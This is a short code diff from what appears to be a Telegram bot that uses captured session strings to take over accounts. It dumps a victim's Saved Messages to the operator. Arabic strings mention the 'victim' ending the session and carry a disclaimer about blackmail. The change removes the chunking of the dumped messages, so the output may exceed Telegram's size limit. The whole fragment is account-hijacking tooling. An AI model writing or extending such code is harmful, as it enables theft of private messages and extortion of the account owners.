@@ -784,11 +784,8 @@ async def users(event):
             return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
         
         saved_messages = await savedmsgs(strses.text)
-       
-        message_parts = [saved_messages[i:i + 4096] for i in range(0, len(saved_messages), 4096)]
-        
-        for part in message_parts:
-            await event.respond(part)
+
+        await event.respond(saved_messages)
         await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
 
 
